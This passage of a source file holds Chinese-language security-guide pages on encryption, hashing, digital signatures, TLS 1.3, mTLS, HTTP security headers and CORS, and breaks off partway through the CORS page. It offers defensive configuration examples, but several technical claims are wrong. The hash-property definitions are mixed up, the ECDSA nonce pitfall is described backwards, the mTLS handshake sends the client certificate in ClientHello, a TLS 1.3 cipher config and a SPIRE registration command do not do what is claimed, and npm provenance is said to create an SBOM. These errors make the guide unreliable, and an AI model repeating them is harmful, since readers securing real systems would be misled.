    iterations=600_000,  # OWASP 推荐
)
key = kdf.derive(password.encode())
```

```python
# 推荐：Argon2id
from argon2.low_level import hash_secret_raw, Type

key = hash_secret_raw(
    secret=password.encode(),
    salt=salt,
    time_cost=3,
    memory_cost=65536,
    parallelism=4,
    hash_len=32,
    type=Type.ID,
)
```

## 关联章节

- **03-crypto/asymmetric**：非对称加密
- **03-crypto/hash**：哈希函数
- **03-crypto/tls-deep-dive**：TLS 1.3 握手

## 一句话总结

> **对称加密 = AES-256-GCM（首选）/ ChaCha20（移动）**。**关键：nonce 唯一 + AEAD + 密钥管理**。**永远不要用 ECB / CBC + HMAC 手动组合**。
""",

"03-crypto/asymmetric.md": """---
title: 非对称加密
---

# 非对称加密

## 一句话总结

> **非对称加密 = 公钥加密 + 私钥解密**（或反向签名）。**两大主流：RSA（兼容）/ ECC（现代推荐）**。**实战：密钥 2048 bit RSA 或 256 bit ECC**。

---

## 主流算法对比

| 算法 | 密钥长度 | 安全等效 | 性能 | 现状 |
|------|---------|---------|------|------|
| **RSA** | 2048 bit | 112 bit | 慢 | 遗留 |
| **RSA** | 4096 bit | ~140 bit | 非常慢 | 高安全 |
| **DH** | 2048 bit | 112 bit | 中 | TLS 密钥交换 |
| **ECC（secp256r1）** | 256 bit | 128 bit | 快 | 标准 |
| **Ed25519** | 256 bit | 128 bit | 极快 | 现代推荐 |
| **X25519** | 256 bit | 128 bit | 极快 | TLS 1.3 推荐 |

## 实战：RSA 加密

```python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

# 1. 生成 RSA 密钥对
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# 2. 公钥加密
ciphertext = public_key.encrypt(
    b"secret",
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None,
    ),
)

# 3. 私钥解密
plaintext = private_key.decrypt(
    ciphertext,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None,
    ),
)
```

❌ **不要用 PKCS1v15**（已被 Bleichenbacher 攻击）

## 实战：Ed25519 签名

```python
from cryptography.hazmat.primitives.asymmetric import ed25519

# 1. 生成密钥对
private_key = ed25519.Ed25519PrivateKey.generate()
public_key = private_key.public_key()

# 2. 签名
signature = private_key.sign(b"message")

# 3. 验证
public_key.verify(signature, b"message")
```

## 实战：X25519 ECDH 密钥交换

```python
from cryptography.hazmat.primitives.asymmetric import x25519

# Alice 和 Bob 各生成密钥对
alice_private = x25519.X25519PrivateKey.generate()
alice_public = alice_private.public_key()

bob_private = x25519.X25519PrivateKey.generate()
bob_public = bob_private.public_key()

# 双方计算共享密钥
alice_shared = alice_private.exchange(bob_public)
bob_shared = bob_private.exchange(alice_public)
# alice_shared == bob_shared
```

## 实战：OpenSSL 生成密钥

```bash
# RSA
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Ed25519
openssl genpkey -algorithm Ed25519 -out private.pem
openssl pkey -in private.pem -pubout -out public.pem
```

## 实战：Java RSA

```java
import java.security.KeyPairGenerator;
import java.security.Signature;

KeyPairGenerator gen = KeyPairGenerator.getInstance("RSA");
gen.initialize(2048);
KeyPair pair = gen.generateKeyPair();

Signature signer = Signature.getInstance("SHA256withRSA");
signer.initSign(pair.getPrivate());
signer.update("message".getBytes());
byte[] signature = signer.sign();
```

## 实战：JWT RS256（OAuth 2.0）

```python
# Auth Server 用 private 签
token = jwt.encode(payload, private_key, algorithm="RS256")

# Resource Server 用 public 验
decoded = jwt.decode(token, public_key, algorithms=["RS256"])
```

## 实战：性能对比

```
        签名 / 验证（同等安全）
RSA 2048     1.0x
RSA 4096     ~7x 慢
ECC 256      ~3x 快
Ed25519      ~10x 快
```

## 关键陷阱

| 陷阱 | 危害 | 防御 |
|------|------|------|
| **RSA 1024** | 可被破解 | 至少 2048 |
| **PKCS1v15** | Bleichenbacher | 用 OAEP |
| **私钥泄漏** | 全失守 | Vault / HSM |
| **短秘钥** | 暴破 | 256 bit ECC |
| **不验证签名** | 中间人 | 强制 verify |

## 关联章节

- **03-crypto/symmetric**：对称加密
- **03-crypto/signature**：数字签名
- **03-crypto/tls-deep-dive**：TLS 1.3 用 ECDHE / Ed25519
- **04-network/tls-pki**：证书公钥

## 一句话总结

> **非对称加密 = RSA / ECC / Ed25519**。**新项目：Ed25519 签名 + X25519 密钥交换**。**遗留：RSA 2048 + OAEP**。**永远不要用 RSA 1024 / PKCS1v15**。
""",

"03-crypto/hash.md": """---
title: 哈希函数
---

# 哈希函数

## 一句话总结

> **哈希 = 单向映射 + 固定输出**。**3 大类：SHA-256（数据完整性）/ bcrypt（密码）/ HMAC（消息认证）**。**核心：抗碰撞 + 抗前缀 + 抗第二原像**。

---

## 主流哈希对比

| 算法 | 输出长度 | 安全性 | 性能 | 用途 |
|------|---------|--------|------|------|
| **MD5** | 128 bit | 已破 | 极快 | ❌ 禁用 |
| **SHA-1** | 160 bit | 已破 | 快 | ❌ 禁用 |
| **SHA-256** | 256 bit | 安全 | 快 | ✅ 通用 |
| **SHA-3** | 256 bit | 安全 | 略慢 | 备选 |
| **BLAKE2** | 256 bit | 安全 | 极快 | 现代 |
| **bcrypt** | 184 bit | 安全 | 慢 | 密码 |
| **Argon2id** | 可变 | 安全 | 可调 | 密码首选 |

## 哈希 3 大安全属性

| 属性 | 含义 |
|------|------|
| **抗碰撞**（Collision） | 难找 x ≠ y 使 H(x) = H(y) |
| **抗第二原像** | 给定 x，难找 y 使 H(x) = H(y) |
| **抗前缀** | 给定 x，难找 y 使 H(y) = H(x) |

## 实战：SHA-256

```python
import hashlib

# 文件完整性
sha = hashlib.sha256()
with open("file.zip", "rb") as f:
    while chunk := f.read(8192):
        sha.update(chunk)
print(sha.hexdigest())
```

```bash
# 命令行
sha256sum file.zip
```

## 实战：密码哈希

```python
# ❌ MD5（彩虹表秒破）
hashlib.md5(password.encode()).hexdigest()

# ✅ bcrypt
import bcrypt
salt = bcrypt.gensalt(rounds=12)  # cost 12 = 2^12 迭代
hash = bcrypt.hashpw(password.encode(), salt)
# 验证
bcrypt.checkpw(password.encode(), hash)
```

```python
# ✅ Argon2id（OWASP 首选）
from argon2 import PasswordHasher
ph = PasswordHasher()
hash = ph.hash(password)
ph.verify(hash, password)
```

## 实战：HMAC（消息认证）

```python
import hmac
import hashlib

# 验证消息完整性
def verify(message: bytes, signature: bytes, key: bytes) -> bool:
    expected = hmac.new(key, message, hashlib.sha256).digest()
    return hmac.compare_digest(signature, expected)  # 防时序攻击
```

## 实战：JWT 签名

```python
# HS256（HMAC-SHA256）
jwt.encode(payload, secret, algorithm="HS256")

# RS256（RSA-SHA256）
jwt.encode(payload, private_key, algorithm="RS256")

# ES256（ECDSA-SHA256）
jwt.encode(payload, ec_private_key, algorithm="ES256")
```

## 实战：彩虹表 + Salt

```python
# ❌ 无 salt（两个用户密码相同 → 哈希相同）
hash1 = hashlib.sha256(b"password123").hexdigest()
hash2 = hashlib.sha256(b"password123").hexdigest()  # 相同

# ✅ 有 salt（每个用户唯一）
salt = os.urandom(16)
hash = hashlib.sha256(salt + b"password123").hexdigest()
# 不同用户有不同 salt
```

## 实战：HKDF（密钥派生）

```python
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

# 从 master key 派生多个子密钥
master_key = b"master-secret-32-bytes"
hkdf = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=None,
    info=b"encryption-key",
)
key1 = hkdf.derive(master_key)
```

## 关键陷阱

| 陷阱 | 危害 | 防御 |
|------|------|------|
| **MD5 / SHA-1** | 碰撞攻击 | 用 SHA-256 |
| **无 salt** | 彩虹表 | 随机 salt |
| **密码用 SHA-256** | GPU 暴力 | bcrypt / Argon2 |
| **自己写 HMAC** | 长度扩展 | 用 HMAC 标准 |
| **错误比较** | 时序攻击 | `hmac.compare_digest` |

## 实战：密码哈希参数

| 算法 | 参数 | 目标耗时 |
|------|------|---------|
| bcrypt | cost=12 | ~250ms |
| bcrypt | cost=14 | ~1s |
| Argon2id | t=3, m=64MB, p=4 | ~500ms |
| PBKDF2 | iter=600000 | ~500ms |

## 关联章节

- **03-crypto/symmetric**：AEAD 内部用哈希
- **03-crypto/signature**：数字签名
- **01-web-top10/a02-crypto-failure**：A02 加密失效

## 一句话总结

> **哈希 = SHA-256（数据）+ bcrypt / Argon2（密码）+ HMAC（认证）**。**密码必加 salt，用慢哈希**。**MD5 / SHA-1 已破，禁用**。
""",

"03-crypto/signature.md": """---
title: 数字签名
---

# 数字签名

## 一句话总结

> **数字签名 = 私钥签名 + 公钥验证**。**核心：身份认证 + 不可否认 + 完整性**。**3 大算法：RSA-PSS / ECDSA / Ed25519**。**应用：JWT / TLS 证书 / 软件签名 / 区块链**。

---

## 签名 vs 加密

| | 加密 | 签名 |
|---|------|------|
| **目的** | 保密 | 认证 + 不可否认 |
| **公钥** | 加密 | 验证 |
| **私钥** | 解密 | 签名 |
| **谁能解密** | 接收方 | 所有人（验证） |

## 主流签名算法

| 算法 | 密钥 | 签名长度 | 性能 | 场景 |
|------|------|---------|------|------|
| **RSA-PSS** | 2048 bit | 256 byte | 慢 | 遗留 |
| **ECDSA** | 256 bit | 64 byte | 快 | 标准 |
| **Ed25519** | 256 bit | 64 byte | 极快 | 现代推荐 |
| **BLS** | 256 bit | 32 byte | 慢 | 区块链 |

## 实战：Ed25519 签名

```python
from cryptography.hazmat.primitives.asymmetric import ed25519

# 签名
private_key = ed25519.Ed25519PrivateKey.generate()
signature = private_key.sign(b"message")

# 验证
public_key = private_key.public_key()
try:
    public_key.verify(signature, b"message")
    print("Valid")
except:
    print("Invalid")
```

## 实战：JWT 签名（RS256 / ES256 / EdDSA）

```python
import jwt

# RS256：用 RSA 私钥签
token = jwt.encode(payload, rsa_private_key, algorithm="RS256")

# ES256：用 ECDSA 私钥签
token = jwt.encode(payload, ec_private_key, algorithm="ES256")

# EdDSA：用 Ed25519 私钥签
token = jwt.encode(payload, ed25519_private_key, algorithm="EdDSA")
```

## 实战：软件签名（Cosign）

```bash
# 签名容器镜像
cosign sign --key cosign.key myregistry.io/myapp:1.0.0

# 验证
cosign verify --key cosign.pub myregistry.io/myapp:1.0.0

# K8s 准入控制（拒绝未签名）
# Kyverno + cosign
```

## 实战：TLS 证书签名

```bash
# 1. 生成 CSR
openssl req -new -key server.key -out server.csr

# 2. CA 签名
openssl x509 -req -in server.csr \
    -CA ca.crt -CAkey ca.key -CAcreateserial \
    -out server.crt -days 365

# 3. 验证
openssl verify -CAfile ca.crt server.crt
```

## 实战：软件包签名（apt / npm）

```bash
# apt
apt-key adv --recv-keys --keyserver keyserver.ubuntu.com KEYID

# npm（cosign 集成）
npm publish --provenance  # npm 自动生成 SBOM + 签名
```

## 实战：Web3 区块链签名

```javascript
// MetaMask 签名
const accounts = await ethereum.request({ method: "eth_requestAccounts" });
const signature = await ethereum.request({
    method: "personal_sign",
    params: ["Hello, world!", accounts[0]],
});

// 验证（服务端）
import { ethers } from "ethers";
const recovered = ethers.verifyMessage("Hello, world!", signature);
console.log(recovered === accounts[0]);  // true
```

## 实战：ECDSA 签名陷阱

```python
# ❌ 错误：使用临时密钥也要 nonce
# 攻击者通过两次签名（同 message + 不同 nonce）推出私钥
# 解决方案：RFC 6979 确定性 nonce

# ✅ Python 库已默认使用
from cryptography.hazmat.primitives.asymmetric import ec
private_key = ec.generate_private_key(ec.SECP256R1())
signature = private_key.sign(b"message", ec.ECDSA(hashes.SHA256()))
# cryptography 库默认用 RFC 6979
```

## 签名信任链

```
┌────────────────────────────────────────┐
│  Root CA（操作系统信任）                 │
│    └─ Intermediate CA                  │
│          └─ 域名证书                    │
│              └─ 你的公钥                │
│  信任链：device trust → root           │
└────────────────────────────────────────┘
```

## 实战：PKCS#7 / CMS 签名

```python
from cryptography.hazmat.primitives.serialization import pkcs7
import os

# 签名文件
signature = private_key.sign(
    open("file.pdf", "rb").read(),
    padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
    hashes.SHA256(),
)
```

## 关联章节

- **03-crypto/asymmetric**：非对称加密
- **03-crypto/hash**：哈希函数
- **04-network/tls-pki**：证书签名
- **05-container/supply-chain**：Cosign 镜像签名

## 一句话总结

> **数字签名 = 私钥签 + 公钥验**。**现代用 Ed25519 / ECDSA**。**应用：JWT / TLS / 镜像 / 软件包 / 区块链**。**关键：私钥保护 + 确定性 nonce（ECDSA）**。
""",

"03-crypto/tls-deep-dive.md": """---
title: TLS 1.3 握手
---

# TLS 1.3 握手详解

## 一句话总结

> **TLS 1.3 = 现代安全通信的事实标准**。**1-RTT 握手（比 TLS 1.2 快 1 轮）+ 强制 AEAD + 0-RTT 模式（慎用）**。**核心：ECDHE 密钥交换 + X25519 / Ed25519**。

---

## TLS 1.3 vs TLS 1.2

| 维度 | TLS 1.2 | TLS 1.3 |
|------|---------|---------|
| 握手轮次 | 2-RTT | 1-RTT（0-RTT 可选）|
| 加密套件 | 数十种 | 5 种（强制 AEAD）|
| 密钥交换 | RSA / DHE / ECDHE | 仅 ECDHE（无 RSA）|
| 加密 | CBC + MAC | AEAD（GCM / ChaCha20）|
| 性能 | 中 | 高 |
| 安全性 | 已发现 POODLE / BEAST | 目前安全 |

## TLS 1.3 1-RTT 握手

```
Client                                              Server
   │                                                  │
   │ ─── ClientHello ─────────────────────────────→ │
   │     - 随机数 client_random                       │
   │     - 支持的密码套件                             │
   │     - key_share（X25519 公钥）                  │
   │                                                  │
   │                                                  │
   │ ←── ServerHello ──────────────────────────── │
   │     - 随机数 server_random                       │
   │     - 选定密码套件                               │
   │     - key_share（X25519 公钥）                  │
   │     - 加密扩展（EncryptedExtensions）           │
   │     - 证书（Certificate）                       │
   │     - 证书验证（CertificateVerify）              │
   │     - Finished（协商完成）                       │
   │                                                  │
   │ （共享密钥：X25519 ECDH）                       │
   │                                                  │
   │ ─── Finished ─────────────────────────────────→ │
   │     - 摘要确认                                  │
   │                                                  │
   │ ←═══ 加密通信 ════════════════════════════════ │ 
```

## TLS 1.3 5 种密码套件

```nginx
# nginx ssl_ciphers 配置
ssl_ciphers TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256;
```

| 套件 | 加密 | 哈希 |
|------|------|------|
| **TLS_AES_256_GCM_SHA384** | AES-256-GCM | SHA-384 |
| **TLS_CHACHA20_POLY1305_SHA256** | ChaCha20-Poly1305 | SHA-256 |
| **TLS_AES_128_GCM_SHA256** | AES-128-GCM | SHA-256 |
| **TLS_AES_128_CCM_SHA256** | AES-128-CCM | SHA-256 |
| **TLS_AES_128_CCM_8_SHA256** | AES-128-CCM-8 | SHA-256 |

## 实战：抓 TLS 1.3 握手

```bash
# 客户端
openssl s_client -tls1_3 -connect example.com:443 -msg

# 输出
# New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
# ...
# Protocol  : TLSv1.3
# Cipher    : TLS_AES_256_GCM_SHA384
```

## 实战：Wireshark 抓包

1. 打开 Wireshark
2. 过滤 `tls.handshake.type == 1`（ClientHello）
3. 查看 `Handshake Protocol: Client Hello`
4. 跟踪 `key_share` 扩展：椭圆曲线 + 公钥

## 实战：Node.js TLS 1.3

```javascript
const https = require("https");
const fs = require("fs");

const options = {
    key: fs.readFileSync("server.key"),
    cert: fs.readFileSync("server.crt"),
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3",
    ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256",
};

https.createServer(options, (req, res) => {
    res.writeHead(200);
    res.end("Hello TLS 1.3!");
}).listen(443);
```

## 实战：0-RTT 模式

```
┌────────────────────────────────────────┐
│  0-RTT：客户端在第一次连接时收到       │
│  Session Ticket，第二次连接时           │
│  立即发送加密数据（0-RTT）               │
│                                        │
│  ⚠️ 风险：重放攻击                      │
│  攻击者重放 0-RTT 数据                   │
│  服务端无法区分"原始请求" vs "重放"     │
│  → 仅用于幂等 GET，禁用 POST/PUT        │
└────────────────────────────────────────┘
```

```nginx
# nginx 0-RTT 配置
ssl_early_data on;
proxy_set_header Early-Data $ssl_early_data;
```

## 实战：Nginx 配置 TLS 1.3

```nginx
server {
    listen 443 ssl http2;
    server_name example.com;

    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;          # TLS 1.3 让客户端选
    ssl_early_data off;                     # 默认禁用 0-RTT
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;
    ssl_session_tickets off;

    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
}
```

## 实战：测试 TLS 1.3

```bash
# testssl.sh
testssl.sh --protocols example.com

# 输出：
# TLS 1.2   offered
# TLS 1.3   offered (default)
```

## 关联章节

- **03-crypto/asymmetric**：ECDHE 密钥交换
- **03-crypto/signature**：Ed25519 / ECDSA
- **04-network/tls-pki**：证书体系
- **04-network/mtls**：双向认证

## 一句话总结

> **TLS 1.3 = 1-RTT + 强制 AEAD + ECDHE**。**5 种密码套件**。**X25519 密钥交换 + Ed25519 签名**。**0-RTT 慎用（重放风险）**。
""",

# ============ 04-network (3 stubs) ============
"04-network/mtls.md": """---
title: mTLS 双向认证
---

# mTLS 双向认证

## 一句话总结

> **mTLS = TLS + 客户端也要证书**。**3 大场景：服务网格 / API 网关 / 零信任**。**优势：双向身份 + 防中间人 + 强认证**。**实施：SPIFFE / SPIRE / Istio / Consul**。

---

## 单向 TLS vs mTLS

```
┌────────────────────────────────────────┐
│  单向 TLS（默认，所有 HTTPS）           │
│  客户端验证服务端证书                     │
│  服务端不验证客户端                       │
│  服务端不知道谁连它                       │
├────────────────────────────────────────┤
│  mTLS（双向）                            │
│  客户端验证服务端证书                     │
│  服务端验证客户端证书                     │
│  双方互相知道身份                         │
│  服务网格 / 零信任标配                    │
└────────────────────────────────────────┘
```

## mTLS 流程

```
Client                                              Server
   │                                                  │
   │  ClientHello + 客户端证书                        │
   │ ─────────────────────────────────────────────→ │
   │                                                  │
   │  ServerHello + 服务端证书 + CertificateRequest  │
   │ ←───────────────────────────────────────────── │
   │                                                  │
   │  CertificateVerify（客户端私钥签名）              │
   │  Finished                                       │
   │ ─────────────────────────────────────────────→ │
   │                                                  │
   │  双向验证完成，应用数据加密传输                    │
   │ ←═════════════════════════════════════════════ │
```

## 实战：Nginx mTLS

```nginx
server {
    listen 443 ssl;
    server_name api.example.com;

    ssl_certificate /etc/ssl/server.crt;
    ssl_certificate_key /etc/ssl/server.key;

    # 客户端证书验证
    ssl_client_certificate /etc/ssl/ca.crt;  # CA bundle
    ssl_verify_client on;                       # 强制 mTLS
    ssl_verify_depth 2;

    # 提取客户端信息
    location / {
        proxy_pass http://upstream;
        proxy_set_header X-Client-DN $ssl_client_s_dn;
        proxy_set_header X-Client-CN $ssl_client_s_dn_cn;
    }
}
```

## 实战：Go mTLS Server

```go
import (
    "crypto/tls"
    "crypto/x509"
    "io/ioutil"
    "log"
    "net/http"
)

func main() {
    // 加载 CA
    caCert, _ := ioutil.ReadFile("ca.crt")
    caCertPool := x509.NewCertPool()
    caCertPool.AppendCertsFromPEM(caCert)

    // TLS 配置
    tlsConfig := &tls.Config{
        ClientAuth: tls.RequireAndVerifyClientCert,
        ClientCAs:  caCertPool,
        MinVersion: tls.VersionTLS12,
    }

    server := &http.Server{
        Addr:      ":443",
        TLSConfig: tlsConfig,
    }
    log.Fatal(server.ListenAndServeTLS("server.crt", "server.key"))
}
```

## 实战：Istio 服务网格 mTLS

```yaml
# 强制命名空间内 mTLS
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: prod
spec:
  mtls:
    mode: STRICT
---
# 允许前端调用订单服务
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: order-service
  namespace: prod
spec:
  selector:
    matchLabels:
      app: order-service
  rules:
    - from:
        - source:
            principals: ["cluster.local/ns/prod/sa/frontend"]
```

## 实战：OpenSSL 生成测试证书

```bash
# 1. CA 私钥 + 证书
openssl genrsa -out ca.key 2048
openssl req -x509 -new -nodes -key ca.key -days 3650 -out ca.crt \
    -subj "/CN=MyCA"

# 2. 服务端证书
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr \
    -subj "/CN=api.example.com"
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
    -out server.crt -days 365

# 3. 客户端证书
openssl genrsa -out client.key 2048
openssl req -new -key client.key -out client.csr \
    -subj "/CN=client-app"
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
    -out client.crt -days 365
```

## 实战：Java mTLS Client

```java
KeyStore clientStore = KeyStore.getInstance("PKCS12");
try (InputStream is = new FileInputStream("client.p12")) {
    clientStore.load(is, "password".toCharArray());
}

KeyManagerFactory kmf = KeyManagerFactory.getInstance("SunX509");
kmf.init(clientStore, "password".toCharArray());

SSLContext sslContext = SSLContext.getInstance("TLSv1.3");
sslContext.init(kmf.getKeyManagers(), null, null);

HttpClient client = HttpClient.newBuilder()
    .sslContext(sslContext)
    .build();

HttpRequest request = HttpRequest.newBuilder()
    .uri(URI.create("https://api.example.com"))
    .build();

client.send(request, BodyHandlers.ofString());
```

## mTLS 在零信任的角色

```
┌────────────────────────────────────────┐
│  零信任 = 三件套                        │
│  ├── SPIFFE / SPIRE：身份               │
│  │   spiffe://trust-domain/workload-id  │
│  ├── mTLS：加密 + 双向认证             │
│  │   自动签发 / 短期 / 轮换             │
│  └── OPA / Cedar：策略                  │
│      "service A 可调用 service B"       │
└────────────────────────────────────────┘
```

## 实战：SPIRE 自动发证书

```bash
# 1. 启动 SPIRE Server
spire-server run -config conf/server.conf

# 2. 启动 SPIRE Agent（每个节点）
spire-agent run -config conf/agent.conf -joinToken <token>

# 3. 注册 Workload
spire-server api fetch x509svid -spiffeID spiffe://example.com/ns/prod/sa/order

# 4. 应用获取 SVID
java -jar app.jar -spiffeSocket /run/spire/sockets/agent.sock
```

## 关联章节

- **04-network/tls-pki**：TLS 证书体系
- **06-zero-trust/overview**：零信任架构
- **06-zero-trust/spiffe**：SPIFFE Workload Identity
- **cloud-native**：Istio 服务网格

## 一句话总结

> **mTLS = 双向证书认证**。**服务网格标配（Istio STRICT）**。**零信任三件套之一。自动化生命周期用 SPIRE**。
""",

"04-network/hsts-csp.md": """---
title: HSTS / CSP / 安全头
---

# HTTP 安全响应头

## 一句话总结

> **HTTP 安全头 = 浏览器层的最后防线**。**5 大头：HSTS（强制 HTTPS）/ CSP（防 XSS）/ X-Frame-Options（防 clickjacking）/ X-Content-Type-Options（防 MIME 嗅探）/ Referrer-Policy（防 referer 泄漏）**。**不可替代代码层防御，但能加一层皮**。

---

## 5 大安全头

| Header | 作用 | 默认 |
|--------|------|------|
| **Strict-Transport-Security** | 强制 HTTPS | ❌ |
| **Content-Security-Policy** | 限制 JS / 资源来源 | ❌ |
| **X-Frame-Options** | 防 iframe 嵌套 | ❌ |
| **X-Content-Type-Options** | 禁止 MIME 嗅探 | ❌ |
| **Referrer-Policy** | 控制 referer 字段 | ❌ |

## HSTS：强制 HTTPS

```nginx
# 强制 HTTPS（1 年 + 子域名 + 预加载）
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

```python
# Flask / FastAPI
@app.after_request
def hsts(response):
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains; preload"
    return response
```

**执行机制**：
- 浏览器首次访问 HTTPS → 收到 HSTS 头 → 记忆 1 年
- 后续 HTTP 访问 → 浏览器自动转 HTTPS（即使你输入 http://）

**预加载（preload）**：提交到 https://hstspreload.org → 浏览器内置列表。

## CSP：限制资源来源

```nginx
# 严格 CSP（仅允许同源 + 指定 CDN）
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' https://cdn.jsdelivr.net;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
" always;
```

```python
# CSP nonce（推荐）
import secrets

nonce = secrets.token_urlsafe(16)
response.headers["Content-Security-Policy"] = f"script-src 'nonce-{nonce}' 'strict-dynamic'"

# HTML：<script nonce="..." src="..."></script>
```

**CSP 关键指令**：

| 指令 | 作用 |
|------|------|
| `default-src` | 默认策略 |
| `script-src` | JS 来源 |
| `style-src` | CSS 来源 |
| `img-src` | 图片来源 |
| `connect-src` | XHR / fetch |
| `frame-ancestors` | 替代 X-Frame-Options |
| `form-action` | 表单提交目标 |
| `base-uri` | <base> 标签 |
| `report-uri` | 违规上报 |

## X-Frame-Options：防 Clickjacking

```nginx
# DENY：完全禁止 iframe
add_header X-Frame-Options "DENY" always;

# SAMEORIGIN：仅同源
add_header X-Frame-Options "SAMEORIGIN" always;
```

```python
# Modern：frame-ancestors 已替代
add_header Content-Security-Policy "frame-ancestors 'none'"
```

## X-Content-Type-Options：禁 MIME 嗅探

```nginx
add_header X-Content-Type-Options "nosniff" always;
```

效果：浏览器严格按 Content-Type 解析，不"猜"。

## Referrer-Policy：防 referer 泄漏

```nginx
# 严格：仅同源带 referer
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

| 策略 | 含义 |
|------|------|
| `no-referrer` | 不发送 |
| `same-origin` | 仅同源 |
| `strict-origin` | 仅同源 + origin |
| `strict-origin-when-cross-origin` | 推荐 |

## Permissions-Policy：浏览器 API 限制

```nginx
add_header Permissions-Policy "
    camera=(),
    microphone=(),
    geolocation=(self),
    payment=()
" always;
```

## 实战：完整 Nginx 配置

```nginx
server {
    listen 443 ssl http2;
    server_name example.com;

    # SSL 配置
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;

    # 6 大安全头
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; frame-ancestors 'none'" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;

    # 不暴露 Server
    server_tokens off;
}
```

## 实战：Spring Security 配置

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy("default-src 'self'")
            .and()
            .httpStrictTransportSecurity(hsts -> hsts
                .includeSubDomains(true)
                .preload(true)
                .maxAgeInSeconds(31536000))
        );
        return http.build();
    }
}
```

## 实战：检测安全头

```bash
# Mozilla Observatory
https://observatory.mozilla.org/

# 自动化
nmap --script http-security-headers example.com
```

## 关联章节

- **04-network/tls-pki**：TLS 基础
- **04-network/cors**：CORS 跨域
- **01-web-top10/a05-misconfig**：A05 配置错误

## 一句话总结

> **6 大安全头 = HSTS + CSP + X-Frame-Options + X-Content-Type-Options + Referrer-Policy + Permissions-Policy**。**Nginx 5 行配置就能加满**。**CSP nonce 模式最安全**。
""",

"04-network/cors.md": """---
title: CORS 跨域
---

# CORS（跨域资源共享）

## 一句话总结

> **CORS = 浏览器跨域访问控制**。**核心：浏览器 + 服务端 + 预检**。**常见错误：Access-Control-Allow-Origin: * + 凭证 = 灾难**。**实战：明确 origin 白名单 + 按需 allow credentials**。

---

## 什么是 CORS

```
┌────────────────────────────────────────┐
│  同源策略（Same-Origin Policy）         │
│  浏览器默认禁止跨域请求                  │
│  https://app.com 只能访问 https://app.com│
├────────────────────────────────────────┤
│  CORS 是 W3C 标准，跨域时增加头：       │
│  服务端说：我允许某 origin 访问         │
│  浏览器：OK，那我放行                   │
└────────────────────────────────────────┘
```

## 简单请求 vs 预检

| 类型 | 触发条件 |
|------|---------|
| **简单请求** | GET / HEAD / POST + 标准头 |
| **预检请求** | PUT / DELETE / 自定义头 / JSON |

### 简单请求

```http
GET /api/users HTTP/1.1
Origin: https://app.com
```

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.com
```

### 预检请求（OPTIONS）

```http
OPTIONS /api/users HTTP/1.1
Origin: https://app.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: X-Custom-Header
```

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Max-Age: 3600
```

## 实战：Spring Boot CORS

```java
@Configuration
public class CorsConfig {
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("https://app.com", "https://admin.example.com"));
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
        config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
        config.setExposedHeaders(List.of("X-Total-Count"));
        config.setAllowCredentials(true);
        config.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);
        return source;
    }
}
```

## 实战：Nginx CORS

```nginx
location /api/ {
    # 动态 origin（不建议）
